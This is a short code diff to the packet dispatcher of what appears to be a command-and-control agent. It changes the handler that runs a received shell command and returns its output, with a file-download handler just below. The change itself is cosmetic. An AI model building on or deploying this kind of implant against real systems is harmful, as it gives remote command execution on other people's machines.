@@ -247,8 +247,9 @@ def process_packet(packetType, data, resultID):
     elif packetType == 40:
         # run a command
         resultData = str(run_command(data))
-        e = build_response_packet(40, resultData, resultID)
-        return build_response_packet(40, resultData, resultID)
+        #Not sure why the line below is there.....
+        #e = build_response_packet(40, resultData, resultID)
+        return build_response_packet(40, resultData + "\r\n[+]Shell command execution completed.", resultID)
 
     elif packetType == 41:
         # file download
